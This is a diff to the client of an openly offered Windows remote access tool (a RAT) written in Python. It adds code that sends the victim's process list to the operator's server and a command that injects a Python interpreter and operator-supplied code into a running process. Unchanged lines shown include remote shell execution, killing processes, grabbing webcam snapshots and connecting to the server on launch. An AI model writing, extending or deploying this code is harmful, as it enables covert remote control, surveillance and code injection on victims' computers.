@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 
 import socket
@@ -22,10 +22,11 @@ import subprocess
 import threading
 import struct
 import cv2
-
+import psutil
 from PIL import ImageGrab
 from time import sleep
 from cryptography.fernet import Fernet
+from pymem import Pymem
 
 SEP = '<sep>' #Create static seperator string
 BUFFER = 4096 #Create static buffer int
@@ -56,12 +57,6 @@ class Utilitys:
         version_output = command.stdout.read().decode()  #Read output from powershell command
         version_output = version_output.replace('\n','') #Replace new line with empty string
         return version_output.strip('\r')                #Strip carriage return and return the output
-
-    #Function will return the output of all running process's on the machine
-    def get_running_process(self):
-        command = subprocess.Popen(['powershell', 'get-process'],stdout=subprocess.PIPE,shell=True) #Run the command
-        com_output = command.stdout.read().decode()         #Capture, read and decode output
-        return com_output                                   #Return output
 
     #Function will get computers local ip and return it as string
     def get_local_ip(self):
@@ -116,8 +111,17 @@ class SystemManager:
 
     #Function will send back a list of running process's to the server
     def extract_process_list(self):
-        process_list = Utilitys().get_running_process() #Get process's
-        ExfilSocket().exfil_socket_send(process_list)   #Send to server
+        process_string = ''                     # Define a local string to store information about the process's
+        for process in psutil.process_iter():   # For each process found in the running process's
+            process_name = process.name()       # Get process name
+            pid = process.pid                   # Get pid of process
+            try:
+                username = process.username()   # Get username
+            except psutil.AccessDenied:
+                username = 'NT AUTHORITY\SYSTEM' # If we are running in userland, admin process's will raise an error on call to username. manually set uname.
+            string = f'{process_name}{SEP}{str(pid)}{SEP}{username}{SEP}\n' #Create string
+            process_string += string    # Append string to local master string
+        ExfilSocket().exfil_socket_send(process_string) #Send local master string to server
 
     #Function will kill a task by the pid passed as parameter and send the output to the server
     def kill_task(self,pid):
@@ -162,6 +166,7 @@ class ClientSocket:
         self.process_manager = 'proc_list'
         self.term_process = 'terminate'
         self.snapshot = 'snap_shot'
+        self.inject_python = 'inject_pie'
 
     #Function will connect to server to initiate handshake
     def connect_to_server(self):
@@ -259,6 +264,8 @@ class ClientSocket:
                 SystemManager().kill_task(server_command[1])                          #kill the task by pid received from server
             if action_flag == self.snapshot:                                          #if the action is to send a snapshot from the webcam
                 StreamSocket().webcam_snapshot()                                      #Send a webcam snapshot
+            if action_flag == self.inject_python:                                     #If the action is to inject some python code,
+                CodeExecution().inject_and_exec(server_command[1],server_command[2])  #Inject python code
 
     #Function will retrieve all data sent by server socket
     def recv_all_data(self):
@@ -378,5 +385,12 @@ class CodeExecution():
             except Exception as error:                   #If there's an error
                 pass
         MultiProcessor().start_child_thread_arg(exec_,system_command) #Start new thread for shell commands. Main thread will continue to communicate with server
+
+    #Function will inject a python interpreter into a process and then load
+    #Python code to be executed by it.
+    def inject_and_exec(self,process_name,python_code):
+        process = Pymem(process_name)                   #Hooke the process
+        process.inject_python_interpreter()             #Inject the python dll
+        process.inject_python_shellcode(python_code)    #Inject the python code into the code
 
 ClientSocket().connect_to_server()
